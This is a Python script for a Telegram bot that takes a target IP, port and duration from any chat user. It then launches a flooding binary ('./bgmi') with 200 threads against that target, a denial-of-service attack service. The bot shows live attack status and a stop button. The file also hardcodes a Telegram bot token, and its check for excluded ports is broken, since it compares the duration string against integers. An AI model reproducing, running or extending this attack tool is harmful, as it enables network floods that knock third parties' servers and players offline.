import subprocess
import time
import telebot
import threading
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.StreamHandler(), logging.FileHandler('attack_log.log')
])
logger = logging.getLogger(__name__)

bot = telebot.TeleBot("7241214892:AAHA1-e8PcnlriU5kSx2Ohz4bjXz6cCoNpo")
DEFAULT_THREADS = 200
active_processes = {}
invalid_ports = {8700, 20000, 443, 17500, 9031, 20002, 20001}

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    cmd = message.text.split()
    if len(cmd) != 3 or not '.' in cmd[0] or not cmd[1].isdigit() or not cmd[2].isdigit():
        bot.reply_to(message, '<target_ip> <port> <time>')
        return
    if cmd[2] in invalid_ports:
        bot.reply_to(message, 'ignored ports 8700, 20000, 443, 17500, 9031, 20002, 20001')
        return
    target_ip, port, total_time = cmd
    flooding_process = subprocess.Popen(['./bgmi', target_ip, port, total_time, str(DEFAULT_THREADS)])
    stop_event = threading.Event()
    active_processes[message.chat.id] = (flooding_process, stop_event)
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("𝗦𝗧𝗢𝗣🚫", callback_data='stop')]])
    aux = bot.reply_to(message, f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗢𝗡𝗚𝗢𝗜𝗡𝗚 ⏳\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕", reply_markup=reply_markup).message_id
    logging.info(f"Attack started by user {message.chat.id} - IP: {target_ip}, Port: {port}, Duration: {total_time}s")

    def update_message():
        remaining_time = int(total_time)
        while remaining_time > 0 and not stop_event.is_set():
            current_message = f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗢𝗡𝗚𝗢𝗜𝗡𝗚 ⏳\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘: {remaining_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕"
            try:
                bot.edit_message_text(text=current_message, chat_id=message.chat.id, message_id=aux, reply_markup=reply_markup)
            except telebot.apihelper.ApiException as e:
                if "message is not modified" not in str(e):
                    logging.error(f"Failed to update message: {e}")
            time.sleep(1)
            remaining_time -= 1

        flooding_process.terminate()
        final_message = f"𝗔𝗧𝗧𝗔𝗖𝗞 {'𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ❌' if stop_event.is_set() else '𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅'}\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕"
        logging.info(f"Attack {'stopped' if stop_event.is_set() else 'completed'} by user {message.chat.id} - IP: {target_ip}, Port: {port}, Duration: {total_time}s")
        try:
            bot.edit_message_text(text=final_message, chat_id=message.chat.id, message_id=aux)
        except Exception as e:
            logging.error(f"Failed to send final message: {e}")

    threading.Thread(target=update_message).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def handle_callback_query(call):
    if call.message.chat.id in active_processes:
        flooding_process, stop_event = active_processes[call.message.chat.id]
        stop_event.set()

bot.polling()
